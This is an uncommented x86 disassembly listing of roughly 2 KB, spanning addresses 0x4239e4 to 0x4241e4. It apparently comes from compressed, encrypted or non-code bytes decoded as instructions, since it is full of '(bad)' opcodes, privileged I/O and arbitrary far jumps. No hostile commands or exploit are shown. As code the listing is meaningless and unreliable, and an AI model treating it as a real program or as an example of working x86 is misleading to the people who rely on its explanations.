  4239e4:	xor    al,0x1d
  4239e6:	xchg   edi,edi
  4239e8:	mov    esi,0x1a1affa6
  4239ed:	bound  ecx,QWORD PTR [edi+0x116290c9]
  4239f3:	pop    esi
  4239f4:	mov    cl,0xeb
  4239f6:	enter  0xb052,0xa1
  4239fa:	sar    DWORD PTR [edx-0x3e3dd247],0x9f
  423a01:	les    edi,FWORD PTR [ebp+0x4e]
  423a04:	outs   dx,BYTE PTR ds:[esi]
  423a05:	mov    esi,0x7990451b
  423a0a:	jb     0x4239bb
  423a0c:	sbb    DWORD PTR [edx-0x33069e95],esi
  423a12:	jns    0x423a28
  423a14:	add    BYTE PTR ds:0x1695050a,al
  423a1a:	test   BYTE PTR [ecx+0x61107d5e],ch
  423a20:	hlt    
  423a21:	mov    al,0x1f
  423a23:	cld    
  423a24:	loop   0x4239cf
  423a26:	rol    ah,cl
  423a28:	xchg   BYTE PTR [edi+ebp*8],al
  423a2b:	xor    al,bh
  423a2d:	and    BYTE PTR [esi],bh
  423a2f:	popf   
  423a30:	sbb    bh,BYTE PTR [edx]
  423a32:	mov    cl,0x62
  423a34:	sub    esp,edx
  423a36:	mov    bl,0x69
  423a38:	push   edi
  423a39:	push   ss
  423a3a:	cld    
  423a3b:	popa   
  423a3c:	repz sahf 
  423a3e:	jns    0x4239e5
  423a40:	jmp    0x487950b4
  423a45:	adc    BYTE PTR [esi],0x89
  423a48:	mov    ebp,0xca7daf54
  423a4d:	rcl    BYTE PTR [edx],1
  423a4f:	mov    edx,0x825db717
  423a54:	daa    
  423a55:	sub    BYTE PTR [ebp+0x6e],bh
  423a58:	adc    al,0x8c
  423a5a:	xor    eax,edx
  423a5c:	sub    DWORD PTR [esi-0x7231a975],ebx
  423a62:	xlat   BYTE PTR ds:[ebx]
  423a63:	fwait
  423a64:	mov    dl,0x9c
  423a66:	fistp  WORD PTR [eax+ecx*1]
  423a69:	(bad)
  423a6c:	push   0x7db1ea81
  423a71:	inc    esp
  423a72:	adc    DWORD PTR [esi+0x4e],edi
  423a75:	aad    0xfb
  423a77:	fnstcw WORD PTR [edx-0x714db32e]
  423a7d:	cmp    BYTE PTR [edx+0x33],bl
  423a80:	lahf   
  423a81:	sbb    al,0x61
  423a83:	sar    BYTE PTR [ecx+0x73],cl
  423a86:	aaa    
  423a87:	cmc    
  423a88:	jb     0x423a28
  423a8a:	into   
  423a8b:	cmp    esi,ecx
  423a8d:	or     ebp,DWORD PTR [ebx]
  423a8f:	ins    DWORD PTR es:[edi],dx
  423a90:	jmp    0x52fdd766
  423a95:	mov    ds:0xb670caeb,al
  423a9a:	in     al,0xa0
  423a9c:	cwde   
  423a9d:	and    eax,DWORD PTR [ecx]
  423a9f:	push   ds
  423aa0:	clc    
  423aa1:	(bad)
  423aa5:	aad    0xf
  423aa7:	out    0x5f,eax
  423aa9:	jl     0x423a69
  423aab:	cwde   
  423aac:	inc    esp
  423aad:	dec    edi
  423aae:	repz xlat BYTE PTR ds:[ebx]
  423ab0:	arpl   bx,bp
  423ab2:	mov    esi,0x72436e9f
  423ab7:	inc    eax
  423ab8:	lods   eax,DWORD PTR ds:[esi]
  423ab9:	ror    DWORD PTR ds:0x804b760d,cl
  423abf:	int3   
  423ac0:	ins    DWORD PTR es:[edi],dx
  423ac1:	jnp    0x423ad3
  423ac3:	push   ds
  423ac4:	mov    edi,0x18abefa5
  423ac9:	repnz inc ebp
  423acb:	dec    DWORD PTR [ecx+eiz*1+0x36910484]
  423ad2:	leave  
  423ad3:	inc    edx
  423ad4:	lahf   
  423ad5:	fdivr  st(0),st
  423ad7:	inc    ecx
  423ad8:	ficomp WORD PTR [ecx-0xf]
  423adb:	std    
  423adc:	adc    esi,edx
  423ade:	dec    edx
  423adf:	xchg   ecx,eax
  423ae0:	mov    esp,0x7f3c9987
  423ae5:	xlat   BYTE PTR ds:[ebx]
  423ae6:	inc    edx
  423ae7:	jbe    0x423a78
  423ae9:	aaa    
  423aea:	and    edx,ecx
  423aec:	or     BYTE PTR [ebx+0x13],0xea
  423af0:	dec    ecx
  423af1:	push   es
  423af2:	lods   al,BYTE PTR ds:[esi]
  423af3:	sub    BYTE PTR [edi+0x19f608ab],0x98
  423afa:	and    al,0x6f
  423afc:	dec    ebx
  423afd:	jno    0x423b0a
  423aff:	push   cs
  423b00:	int3   
  423b01:	xchg   ebx,eax
  423b02:	sbb    cl,BYTE PTR [esi-0x64]
  423b05:	dec    ebx
  423b06:	mov    edx,0x7f6425cc
  423b0b:	fwait
  423b0c:	loopne 0x423ad7
  423b0e:	add    eax,ebp
  423b10:	sub    bh,bh
  423b12:	test   ebx,edi
  423b14:	mov    ds,WORD PTR [eax+0x24]
  423b17:	fcomp  QWORD PTR [esi+0x42]
  423b1a:	rol    cl,1
  423b1c:	mov    ds:0xd90f3a26,al
  423b21:	xchg   edi,eax
  423b22:	(bad)  
  423b23:	pop    ds
  423b24:	jecxz  0x423afb
  423b26:	fld    TBYTE PTR [eax]
  423b28:	retf   
  423b29:	sub    al,0xeb
  423b2b:	dec    ax
  423b2d:	fst    DWORD PTR [ecx-0x5f]
  423b30:	pop    esp
  423b31:	jge    0x423b50
  423b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b34:	out    0x10,eax
  423b36:	hlt    
  423b37:	outs   dx,DWORD PTR ds:[esi]
  423b38:	mov    cs,WORD PTR [eax+0x69]
  423b3b:	mov    bh,0x2f
  423b3d:	lods   eax,DWORD PTR es:[esi]
  423b3f:	cmp    eax,0xe4d3a8c
  423b44:	cdq    
  423b45:	or     eax,0x6d0fd340
  423b4a:	jecxz  0x423b0c
  423b4c:	out    0x12,eax
  423b4e:	rol    BYTE PTR [ecx],1
  423b50:	adc    edi,DWORD PTR [eax]
  423b52:	jmp    0x82f94834
  423b57:	and    BYTE PTR [edx],0xd3
  423b5a:	arpl   bp,si
  423b5c:	div    BYTE PTR [edi-0x19]
  423b5f:	jge    0x423b9c
  423b61:	mov    dh,0x5d
  423b63:	pop    ecx
  423b64:	fldenv [esi+0x3787014b]
  423b6a:	inc    edi
  423b6b:	add    dh,bl
  423b6d:	jns    0x423af4
  423b6f:	popf   
  423b70:	lods   al,BYTE PTR ds:[esi]
  423b71:	cmp    dh,cl
  423b73:	pop    edi
  423b74:	sar    BYTE PTR [edx],1
  423b76:	rcl    DWORD PTR [ecx-0x5c],1
  423b79:	jg     0x423b29
  423b7b:	(bad)  
  423b7c:	cwde   
  423b7d:	les    esp,FWORD PTR [ebp+0x28bd07d4]
  423b83:	loopne 0x423b9f
  423b85:	imul   BYTE PTR [eax]
  423b87:	dec    DWORD PTR [esi]
  423b89:	loope  0x423b6a
  423b8b:	mov    DWORD PTR [ebp+0x2a0d0ebe],ecx
  423b91:	iret   
  423b92:	cvttps2pi mm4,QWORD PTR [ebx+0x69421a76]
  423b99:	in     eax,dx
  423b9a:	cmp    BYTE PTR [ebx+eax*1],ch
  423b9d:	and    eax,0xffa2ed5b
  423ba2:	cmp    ecx,0xdd948f44
  423ba8:	pop    esp
  423ba9:	loop   0x423c0d
  423bab:	mov    bl,0xbc
  423bad:	fisttp DWORD PTR [edi+0x692ed617]
  423bb3:	xlat   BYTE PTR ds:[ebx]
  423bb4:	push   ebx
  423bb5:	push   edi
  423bb6:	fmul   st(6),st
  423bb8:	pop    es
  423bb9:	or     DWORD PTR [edi-0x6c],ebx
  423bbc:	(bad)  
  423bbd:	cmp    esp,DWORD PTR [ecx+0x1efde51a]
  423bc3:	ins    BYTE PTR es:[edi],dx
  423bc4:	mov    edx,0x798df555
  423bc9:	adc    DWORD PTR [esi],edx
  423bcb:	jl     0x423b72
  423bcd:	sbb    al,0x3c
  423bcf:	jmp    0x8ef06831
  423bd4:	into   
  423bd5:	inc    eax
  423bd6:	lods   al,BYTE PTR ds:[esi]
  423bd7:	pop    es
  423bd8:	xor    BYTE PTR [edi],dh
  423bda:	jmp    0x77db:0x43ea7dc2
  423be1:	xchg   DWORD PTR [ebp-0x2c],esi
  423be4:	in     al,0x4e
  423be6:	jbe    0x423bce
  423be8:	fldcw  WORD PTR [edx]
  423bea:	out    dx,eax
  423beb:	push   edx
  423bec:	leave  
  423bed:	mov    ds:0xd8048887,al
  423bf2:	ins    DWORD PTR es:[edi],dx
  423bf3:	(bad)  
  423bf4:	cmp    al,0x62
  423bf6:	das    
  423bf7:	or     bl,bl
  423bf9:	pushf  
  423bfa:	stos   BYTE PTR es:[edi],al
  423bfb:	ror    edx,0x6c
  423bfe:	repz xor DWORD PTR [edi+0x7d],edx
  423c02:	mov    dh,0xa7
  423c04:	ins    DWORD PTR es:[edi],dx
  423c05:	adc    edi,ecx
  423c07:	pop    ds
  423c08:	mov    bl,0x8a
  423c0a:	or     DWORD PTR [ebx],esi
  423c0c:	mov    al,ds:0xe6c9957c
  423c11:	xor    al,ah
  423c13:	xchg   ecx,eax
  423c14:	push   esi
  423c15:	and    al,0x6e
  423c17:	(bad)  
  423c18:	retf   0xaf3e
  423c1b:	into   
  423c1c:	jmp    0x110d:0x3ba60c14
  423c23:	adc    dh,BYTE PTR [ebp-0x2e]
  423c26:	das    
  423c27:	clc    
  423c28:	lahf   
  423c29:	and    al,0xf3
  423c2b:	jmp    0x7b1538da
  423c30:	les    edi,FWORD PTR [ebp-0x14]
  423c33:	xchg   ecx,eax
  423c34:	stos   BYTE PTR es:[edi],al
  423c35:	mov    WORD PTR [ecx+0x39],?
  423c38:	outs   dx,BYTE PTR ds:[esi]
  423c39:	out    dx,al
  423c3a:	jge    0x423c8f
  423c3c:	cmp    eax,DWORD PTR [esi+0x40981939]
  423c42:	sub    DWORD PTR [ecx-0x27],ecx
  423c45:	in     eax,dx
  423c46:	fsub   DWORD PTR [ecx+0x15498c23]
  423c4c:	add    BYTE PTR [edi+ecx*8],bl
  423c4f:	inc    esp
  423c50:	mov    esp,0xd1c87613
  423c55:	pop    esi
  423c56:	std    
  423c57:	xor    ebx,DWORD PTR [edi]
  423c59:	fld    QWORD PTR ds:0xb95b0f5c
  423c5f:	repnz cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  423c62:	stos   DWORD PTR es:[edi],eax
  423c63:	add    DWORD PTR [ecx-0x42],0xffffffbf
  423c67:	mov    ebx,0xbdb2f9bb
  423c6c:	push   es
  423c6d:	lods   al,BYTE PTR ds:[esi]
  423c6e:	jmp    0x423c2b
  423c70:	std    
  423c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c72:	cld    
  423c73:	push   es
  423c74:	fdiv   st,st(7)
  423c76:	pop    eax
  423c77:	or     eax,ebx
  423c79:	call   0x521b:0x6d53c2d6
  423c80:	(bad)  
  423c81:	pop    eax
  423c82:	xor    BYTE PTR [edx+0x3e0ae2cc],ch
  423c88:	(bad)  
  423c89:	jl     0x423c27
  423c8b:	imul   ebx,DWORD PTR [edx],0xcf071d6e
  423c91:	cmc    
  423c92:	mov    dl,0xf5
  423c94:	(bad)  
  423c95:	adc    dh,ch
  423c97:	cmp    BYTE PTR [edi+0x10d5d3dc],cl
  423c9d:	sbb    al,0xcc
  423c9f:	xchg   ecx,eax
  423ca0:	fist   DWORD PTR [ebx]
  423ca2:	aas    
  423ca3:	jmp    0x51b7:0xacd6797b
  423caa:	mov    gs,WORD PTR [ecx+0x6fd7cf06]
  423cb0:	bndstx [ebx+0x35],bnd1
  423cb4:	push   ebx
  423cb5:	sbb    cl,bl
  423cb7:	add    BYTE PTR [edx+edx*8+0x1c2dac20],bh
  423cbe:	fidivr DWORD PTR [edi-0x53]
  423cc1:	mov    bh,0x7d
  423cc3:	es push es
  423cc5:	pop    ds
  423cc6:	jns    0x423c7a
  423cc8:	sbb    al,0xd4
  423cca:	jno    0x423d19
  423ccc:	or     bl,BYTE PTR [ebp+ebp*2+0x5c9f78a1]
  423cd3:	scas   al,BYTE PTR es:[edi]
  423cd4:	jmp    0xa5d20986
  423cd9:	dec    ebx
  423cda:	xchg   esp,eax
  423cdb:	jo     0x423c9d
  423cdd:	not    BYTE PTR cs:[eax-0x2c88c9a2]
  423ce4:	sbb    dl,BYTE PTR [edi+0x36218c6f]
  423cea:	xchg   ebp,eax
  423ceb:	fstp   DWORD PTR [esi]
  423ced:	mov    dh,0x42
  423cef:	lea    ebp,[edx+0x5613a363]
  423cf5:	mov    WORD PTR [ebx+0x170850c7],fs
  423cfb:	(bad)  
  423cfd:	inc    ebp
  423cfe:	inc    edx
  423cff:	or     al,0xf7
  423d01:	sub    esp,DWORD PTR [ecx+ecx*2]
  423d04:	cs jecxz 0x423d2e
  423d07:	in     al,0x20
  423d09:	jns    0x423d26
  423d0b:	sub    edx,esp
  423d0d:	imul   ebx,DWORD PTR [ebx-0x6960e078],0x5a
  423d14:	pop    esi
  423d15:	sub    BYTE PTR [ecx+ecx*4-0x3f],bh
  423d19:	inc    ebx
  423d1a:	and    BYTE PTR [ecx+eax*1+0x3a],0xb9
  423d1f:	aad    0xc
  423d21:	iret   
  423d22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d23:	xlat   BYTE PTR ds:[ebx]
  423d24:	out    0xea,al
  423d26:	sub    al,0xcd
  423d28:	scas   eax,DWORD PTR es:[edi]
  423d29:	xor    eax,0xf9d5dd59
  423d2e:	adc    ebx,DWORD PTR [ecx-0x3]
  423d31:	mov    edx,DWORD PTR [ecx+0x2e38f76a]
  423d37:	dec    edi
  423d38:	fisttp DWORD PTR [ebp+ecx*1-0x31266a09]
  423d3f:	or     ebp,DWORD PTR [ecx+0x65]
  423d42:	xor    eax,DWORD PTR [esi+0x2d]
  423d45:	iret   
  423d46:	mov    al,BYTE PTR [ecx]
  423d48:	das    
  423d49:	rol    dh,1
  423d4b:	(bad)  
  423d4c:	(bad)  [edi-0x7bae7aae]
  423d52:	add    eax,0x28518c73
  423d57:	jp     0x423d1b
  423d59:	sbb    ch,bl
  423d5b:	add    DWORD PTR [esi-0x54517ad1],0x5b76a12
  423d65:	xchg   ecx,eax
  423d66:	add    BYTE PTR [edx-0x8],0xf1
  423d6a:	lahf   
  423d6b:	bnd jge 0x423d51
  423d6e:	and    al,0xda
  423d70:	loop   0x423d96
  423d72:	retf   
  423d73:	add    bh,BYTE PTR [ebp+ebx*1+0x384bce95]
  423d7a:	mov    ebx,0xe0df5ea4
  423d7f:	jge    0x423dd6
  423d81:	or     eax,0xe5ecca65
  423d86:	and    BYTE PTR [ebx],dl
  423d88:	pusha  
  423d89:	dec    edx
  423d8a:	add    BYTE PTR ds:0x6e4d7107,0x59
  423d91:	push   ds
  423d92:	lods   eax,DWORD PTR ds:[esi]
  423d93:	xchg   dh,bl
  423d95:	pop    edx
  423d96:	push   esp
  423d97:	mov    dl,0xfb
  423d99:	(bad)  
  423d9a:	dec    esp
  423d9b:	xchg   BYTE PTR [ecx-0x16],dh
  423d9e:	mov    ebx,0x75ac9d4e
  423da3:	les    edi,FWORD PTR [edx+0x28]
  423da6:	mov    ds:0x29026bfe,al
  423dab:	scas   al,BYTE PTR es:[edi]
  423dac:	cdq    
  423dad:	mov    esp,0x66c27b86
  423db2:	push   ss
  423db3:	addr16 mov ah,0xb3
  423db6:	cwde   
  423db7:	mov    eax,0xeb65716c
  423dbc:	cmc    
  423dbd:	pcmpeqb mm4,QWORD PTR [edx]
  423dc0:	out    0x89,al
  423dc2:	mov    ebx,ss
  423dc4:	xchg   ebx,eax
  423dc5:	cdq    
  423dc6:	ficom  DWORD PTR [eax]
  423dc8:	mov    ds:0xba0bd6fc,eax
  423dcd:	pusha  
  423dce:	and    eax,0x5c87dfa8
  423dd3:	pop    edx
  423dd4:	(bad)  
  423dd5:	out    dx,al
  423dd6:	sub    eax,0x9e22e951
  423ddb:	mov    dh,0x8f
  423ddd:	dec    esi
  423dde:	adc    bl,BYTE PTR [edx-0x40f5f473]
  423de4:	pop    es
  423de5:	retf   0x70dc
  423de8:	cmp    al,0x22
  423dea:	and    al,0x72
  423dec:	push   cs
  423ded:	gs stc 
  423def:	push   ds
  423df0:	shr    ecx,0xd0
  423df3:	adc    DWORD PTR [esi-0x11],ecx
  423df6:	cmp    ecx,esp
  423df8:	retf   0x240
  423dfb:	aaa    
  423dfc:	cmp    BYTE PTR [esi-0x59],ch
  423dff:	xchg   edi,eax
  423e00:	scas   al,BYTE PTR es:[edi]
  423e01:	fldcw  WORD PTR [eax]
  423e03:	test   BYTE PTR [edi+0x21],bh
  423e06:	js     0x423db6
  423e08:	add    ebp,DWORD PTR [esi-0x5ef75639]
  423e0e:	adc    al,0x5f
  423e10:	ror    DWORD PTR [ecx-0x814f9a1],0xff
  423e17:	mov    al,ds:0x15aca697
  423e1c:	test   DWORD PTR [ebp+0x46],ebx
  423e1f:	into   
  423e20:	mov    al,ds:0xe3240a29
  423e25:	adc    bh,BYTE PTR [edx]
  423e27:	out    dx,eax
  423e28:	rol    bl,cl
  423e2a:	sti    
  423e2b:	xor    al,0x35
  423e2d:	arpl   WORD PTR ds:0x806ec756,cx
  423e33:	(bad)  [esi+0x2e9489a6]
  423e39:	repz push cs
  423e3b:	jne    0x423e66
  423e3d:	(bad)  
  423e3e:	aas    
  423e3f:	mul    DWORD PTR [ecx+edi*2]
  423e42:	inc    eax
  423e43:	scas   al,BYTE PTR es:[edi]
  423e44:	push   esi
  423e45:	es mov esp,0x8cecdd52
  423e4b:	(bad)  
  423e4d:	adc    ah,BYTE PTR [ebx+0x31]
  423e50:	stc    
  423e51:	fucomp st(0)
  423e53:	imul   esi,eax,0xffffffbb
  423e56:	add    esi,0x7f4f6685
  423e5c:	fwait
  423e5d:	xor    ah,dl
  423e5f:	ffree  st(2)
  423e61:	dec    ebp
  423e62:	nop
  423e63:	sbb    esp,DWORD PTR [edi-0x3c]
  423e66:	mov    edi,0x659679c4
  423e6b:	mov    edx,DWORD PTR [esi]
  423e6d:	rcl    BYTE PTR [ebp+0x36],1
  423e70:	push   0x26bcae6c
  423e75:	sbb    esp,DWORD PTR [ecx+0x1a7279d7]
  423e7b:	es jne 0x423eca
  423e7e:	mov    ebp,0xed9b7c44
  423e83:	addr16 and eax,0xa689acfe
  423e89:	or     al,0x20
  423e8b:	and    edx,DWORD PTR [ebp-0x16]
  423e8e:	and    DWORD PTR ss:0x7b007d5c,0x30
  423e96:	xor    DWORD PTR [edx-0x29],esp
  423e99:	adc    DWORD PTR [edi-0x30],eax
  423e9c:	and    esp,DWORD PTR [edi]
  423e9e:	retf   0xeedb
  423ea1:	fdivr  QWORD PTR ds:0x82b7c75b
  423ea7:	into   
  423ea8:	add    eax,0x5057be44
  423ead:	dec    edi
  423eae:	imul   eax,DWORD PTR [edx-0x43b47619],0x78019ad7
  423eb8:	pop    esp
  423eb9:	repz fwait
  423ebb:	push   ebx
  423ebc:	or     al,0x42
  423ebe:	fnstenv [esp+eax*2+0x3eb0b7f6]
  423ec5:	pusha  
  423ec6:	xchg   ebx,eax
  423ec7:	stos   BYTE PTR es:[edi],al
  423ec8:	mov    ecx,0x34d3a93a
  423ecd:	jp     0x423ebc
  423ecf:	mov    edi,0x58d382b7
  423ed4:	sti    
  423ed5:	and    dl,bl
  423ed7:	xchg   esp,eax
  423ed8:	add    ebx,esp
  423eda:	and    BYTE PTR [ebp+0xf058ab0],ah
  423ee0:	mov    ecx,DWORD PTR [edx+ecx*4]
  423ee3:	jmp    DWORD PTR [edx-0x5e1bea71]
  423ee9:	lea    ebx,[esi]
  423eeb:	dec    ebp
  423eec:	push   es
  423eed:	pop    ecx
  423eee:	hlt    
  423eef:	mul    esi
  423ef1:	aad    0x41
  423ef3:	push   ecx
  423ef4:	gs mov edx,0x861cd6cb
  423efa:	add    ch,BYTE PTR [eax]
  423efc:	and    al,0x80
  423efe:	push   0xbd08776f
  423f03:	jnp    0x423efc
  423f05:	xor    al,0x25
  423f07:	jns    0x423ec0
  423f09:	push   es
  423f0a:	lods   eax,DWORD PTR ds:[esi]
  423f0b:	rol    BYTE PTR [ecx],cl
  423f0d:	das    
  423f0e:	cmp    DWORD PTR [edi],edx
  423f10:	aaa    
  423f11:	gs push ecx
  423f13:	retf   0xf12f
  423f16:	inc    edx
  423f17:	jmp    0x423ebe
  423f19:	js     0x423f3f
  423f1b:	push   edx
  423f1c:	in     eax,dx
  423f1d:	and    dh,bl
  423f1f:	cmp    BYTE PTR [ecx-0xb54815a],bl
  423f25:	repnz mov bl,0xc2
  423f28:	ss inc ebp
  423f2a:	jns    0x423f43
  423f2c:	ret    0xe73c
  423f2f:	mov    al,0xb8
  423f31:	adc    BYTE PTR [esi-0x29f86453],al
  423f37:	or     bl,BYTE PTR [edi]
  423f39:	mov    esp,0x7cedeed4
  423f3e:	jns    0x423f8d
  423f40:	mov    dl,0xd7
  423f42:	(bad)  
  423f43:	jmp    0xeaea:0x5e90f129
  423f4a:	fdecstp 
  423f4c:	adc    eax,0x66f8ba4b
  423f51:	retf   0xc5e1
  423f54:	and    DWORD PTR ds:0x921c0f73,esp
  423f5a:	inc    edi
  423f5b:	(bad)  
  423f5c:	cs jb  0x423edf
  423f5f:	add    dl,BYTE PTR [ecx-0x59412b36]
  423f65:	ins    BYTE PTR es:[edi],dx
  423f66:	jge    0x423eeb
  423f68:	je     0x423f0b
  423f6a:	inc    edx
  423f6b:	cmp    DWORD PTR [ebp+0xf],ebx
  423f6e:	pop    esi
  423f6f:	pop    ss
  423f70:	test   eax,0x519fa1d9
  423f75:	or     ah,BYTE PTR [ecx-0x4733659c]
  423f7b:	scas   al,BYTE PTR es:[edi]
  423f7c:	or     DWORD PTR [edx],esi
  423f7e:	fld    QWORD PTR [ecx]
  423f80:	aad    0xea
  423f82:	jns    0x423f6d
  423f84:	xor    edi,DWORD PTR [edi+0x2]
  423f87:	cmp    al,al
  423f89:	sub    bh,0x3d
  423f8c:	mov    ds:0x72085439,eax
  423f91:	mov    dh,0x5e
  423f93:	push   edx
  423f94:	out    0xbe,al
  423f96:	cwde   
  423f97:	mov    cs,WORD PTR [esi]
  423f99:	fstp   DWORD PTR [ebx+eiz*8]
  423f9c:	jge    0x42400f
  423f9e:	fisubr WORD PTR [edi+0x66f044d8]
  423fa4:	sahf   
  423fa5:	nop
  423fa6:	sub    esi,DWORD PTR [edi+eax*8]
  423fa9:	or     al,0x3c
  423fab:	lea    eax,[ebx-0x145195ee]
  423fb1:	loop   0x423fbb
  423fb3:	xchg   ebp,eax
  423fb4:	test   BYTE PTR [esi],bl
  423fb6:	cmp    eax,0x829f0f11
  423fbb:	outs   dx,DWORD PTR ds:[esi]
  423fbc:	push   ecx
  423fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fbe:	cmovb  ebp,esp
  423fc1:	cdq    
  423fc2:	fs in  eax,dx
  423fc4:	jmp    FWORD PTR [esi+0x52f9459]
  423fca:	adc    al,dh
  423fcc:	cmp    ebp,DWORD PTR [ebx]
  423fce:	repz rcr ecx,0x4f
  423fd2:	sbb    esp,DWORD PTR ds:[edi+0x4a685a03]
  423fd9:	mov    ds:0xbfbf6ce0,eax
  423fde:	mov    ss,WORD PTR [edx+0x3b99ba71]
  423fe4:	jecxz  0x424032
  423fe6:	inc    eax
  423fe7:	jnp    0x424008
  423fe9:	sbb    ch,al
  423feb:	out    dx,al
  423fec:	hlt    
  423fed:	pop    esi
  423fee:	mov    esp,0x77c17249
  423ff3:	cmp    DWORD PTR [eax+0x4931],edi
	...
  42403d:	add    BYTE PTR [edi-0x73],dl
  424040:	popa   
  424041:	jle    0x42403e
  424043:	(bad)  
  424044:	pop    edi
  424045:	lods   eax,DWORD PTR ds:[esi]
  424046:	into   
  424047:	fisttp DWORD PTR [edx+0x58]
  42404a:	mov    ds:0xf7309dc3,al
  42404f:	das    
  424050:	add    DWORD PTR [eax],eax
  424052:	and    al,BYTE PTR [edi]
  424054:	add    BYTE PTR [eax],al
  424056:	cdq    
  424057:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  424059:	mov    dl,0x8e
  42405b:	pop    es
  42405c:	out    0xd4,eax
  42405e:	les    esp,FWORD PTR [edi]
  424060:	xchg   DWORD PTR [ebx+0x6c],ebp
  424063:	jmp    0xfb8d:0x852f9e0a
  42406a:	mov    ecx,0x1a9d5512
  42406f:	imul   ecx
  424071:	sbb    bl,0x50
  424074:	mov    edi,0x4ed90bac
  424079:	nop
  42407a:	repnz add eax,0x8fe595bf
  424080:	sub    cl,BYTE PTR [ebx]
  424082:	imul   ecx,DWORD PTR [edi],0x71f83799
  424088:	pop    ecx
  424089:	iret   
  42408a:	dec    ebp
  42408b:	outs   dx,BYTE PTR ds:[esi]
  42408c:	pop    esp
  42408d:	dec    eax
  42408e:	(bad)  
  42408f:	push   eax
  424090:	int3   
  424091:	scas   al,BYTE PTR es:[edi]
  424092:	jle    0x4240f6
  424094:	cmp    eax,0x99c9be98
  424099:	rcl    edx,1
  42409b:	loopne 0x424116
  42409d:	fwait
  42409e:	in     al,0xd2
  4240a0:	(bad)  
  4240a1:	jne    0x4240ba
  4240a3:	mov    ds:0x8d0df945,al
  4240a8:	cmp    eax,0xf6e998c1
  4240ad:	mov    eax,ds:0xdd898f3a
  4240b2:	jl     0x4240b9
  4240b4:	push   cs
  4240b5:	push   ecx
  4240b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240b7:	ret    
  4240b8:	sub    DWORD PTR [eax+esi*8+0x74],esi
  4240bc:	pop    edx
  4240bd:	sbb    cl,BYTE PTR [edx]
  4240bf:	mov    eax,0x1ffbce09
  4240c4:	imul   esi,DWORD PTR [ecx-0x3ef79051],0x58
  4240cb:	inc    edx
  4240cc:	jp     0x4240a8
  4240ce:	or     al,0x82
  4240d0:	shl    DWORD PTR [esi+0x35dada3e],0x4a
  4240d7:	adc    cl,BYTE PTR [esi-0x613b454b]
  4240dd:	or     DWORD PTR [ebx-0x435f61be],ecx
  4240e3:	push   ds
  4240e4:	dec    edx
  4240e5:	push   esi
  4240e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240e7:	pusha  
  4240e8:	add    DWORD PTR [edi],ecx
  4240ea:	icebp  
  4240eb:	jecxz  0x42412b
  4240ed:	xor    al,0x24
  4240ef:	mov    esp,0xab29faef
  4240f4:	cmp    cl,BYTE PTR [ebp+0x34]
  4240f7:	xchg   edi,eax
  4240f8:	pop    ds
  4240f9:	in     al,0x6f
  4240fb:	enter  0xf469,0x3f
  4240ff:	mov    al,0x71
  424102:	mov    bl,0xb3
  424104:	push   0x6bd03a9d
  424109:	add    BYTE PTR [edx+0x782690bb],dl
  42410f:	mov    esi,0x3151afe4
  424114:	div    DWORD PTR [edx+0x11]
  424117:	mov    ah,0x73
  424119:	mov    eax,0xd947cb94
  42411e:	jb     0x4240c3
  424120:	int3   
  424121:	or     dh,ah
  424123:	jmp    0xfb60c91d
  424128:	retf   
  424129:	xchg   esi,eax
  42412a:	retf   
  42412b:	pop    es
  42412c:	gs push 0x6
  42412f:	mov    edx,?
  424131:	mov    edi,0x7de58edd
  424136:	and    dl,bl
  424138:	repz inc esp
  42413b:	pop    eax
  42413c:	(bad)  
  42413d:	aas    
  42413e:	mov    ch,0x1c
  424140:	add    BYTE PTR [ecx-0x3443821a],bh
  424146:	cmp    bh,cl
  424148:	enter  0x8c02,0xcf
  42414c:	and    edx,DWORD PTR [ecx-0x43]
  42414f:	fs hlt 
  424151:	adc    al,0x10
  424153:	pop    ds
  424154:	int    0xe
  424156:	sub    DWORD PTR [ebp-0x51],ecx
  424159:	in     al,dx
  42415a:	jo     0x424153
  42415c:	xchg   esp,eax
  42415d:	and    eax,0x7d106505
  424162:	mov    bl,0x9b
  424164:	adc    DWORD PTR [edi-0x3ac873f2],ecx
  42416a:	sti    
  42416b:	jmp    0x77910104
  424170:	andps  xmm2,XMMWORD PTR [ebp+0x55e66707]
  424177:	push   ebp
  424178:	and    ecx,DWORD PTR [edi+0x1a6bc4b6]
  42417e:	ins    BYTE PTR es:[edi],dx
  42417f:	xlat   BYTE PTR ds:[ebx]
  424180:	test   eax,0x9744e8ca
  424185:	outs   dx,DWORD PTR ds:[esi]
  424186:	test   ecx,0x1ffe664e
  42418c:	jle    0x42412b
  42418e:	fadd   st(2),st
  424190:	pop    eax
  424191:	cmp    al,BYTE PTR [eax+0x1e]
  424194:	fld    DWORD PTR [ebx]
  424196:	ss aad 0x5c
  424199:	scas   eax,DWORD PTR es:[edi]
  42419a:	mov    eax,0xe0abfcdf
  42419f:	das    
  4241a0:	and    al,0xd6
  4241a2:	stc    
  4241a3:	shl    BYTE PTR [esi],0x25
  4241a6:	fmulp  st(7),st
  4241a8:	xchg   esi,eax
  4241a9:	dec    edi
  4241aa:	int3   
  4241ab:	pop    ds
  4241ac:	sar    DWORD PTR [ecx],0x43
  4241af:	arpl   WORD PTR cs:[ebx-0x50],bp
  4241b3:	pop    esi
  4241b4:	mov    cl,0xe3
  4241b6:	push   esp
  4241b7:	inc    edi
  4241b8:	push   0x1a
  4241ba:	xor    eax,0x4595dcea
  4241bf:	(bad)  
  4241c0:	in     al,0xc4
  4241c2:	sbb    bl,BYTE PTR [edx+0x7ff4cc67]
  4241c8:	ficomp WORD PTR [edi+eiz*8+0x22]
  4241cc:	or     dh,BYTE PTR fs:[eax-0x3e]
  4241d0:	dec    ebx
  4241d1:	push   ss
  4241d2:	dec    edx
  4241d3:	jecxz  0x424226
  4241d5:	or     al,dl
  4241d7:	loopne 0x42417c
  4241d9:	fwait
  4241da:	outs   dx,BYTE PTR ds:[esi]
  4241db:	inc    ecx
  4241dc:	xchg   edx,eax
  4241dd:	push   eax
  4241de:	ss pop edi
  4241e0:	dec    edi
  4241e1:	push   ebx
  4241e2:	or     ch,BYTE PTR [ecx]
  4241e4:	dec    ebx
